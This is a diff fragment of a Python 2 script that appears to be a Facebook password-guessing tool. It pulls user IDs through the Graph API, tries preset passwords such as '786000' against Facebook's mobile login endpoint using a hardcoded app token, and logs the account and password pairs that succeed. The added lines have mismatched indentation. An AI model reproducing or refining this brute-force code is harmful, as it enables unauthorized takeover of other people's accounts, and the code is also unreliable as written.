@@ -292,7 +292,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:jam
+			pass #Dev:hamza
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -380,6 +380,8 @@ def pilih_super():
                                                                                                                         print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m▬\x1b[1;32m ' + user + ' \x1b[1;32m▬\x1b[1;32m ' + pass12
                                                                                                                         oks.append(user+pass12)
 														else:
+															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+                                                                                                                        b = json.loads(a.text)
 															pass13 = '786000'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
